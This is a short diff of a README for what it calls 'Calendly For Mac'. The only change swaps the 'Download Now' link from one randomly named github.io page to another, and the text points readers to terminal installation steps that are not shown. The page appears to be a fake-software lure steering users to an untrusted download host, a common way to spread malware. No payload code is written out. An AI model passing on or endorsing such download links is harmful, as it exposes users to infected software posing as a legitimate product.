@@ -4,7 +4,7 @@
 
 Calendly For Mac is a powerful scheduling software designed for macOS users, simplifying the process of booking meetings and managing appointments. Streamline your calendar with automated scheduling and integrations. Follow the instructions below to install Calendly on your Mac and enhance your productivity.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/calendly)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/calendly)
 
 If the download button doesn’t work, follow the manual installation instructions below using the terminal.
 
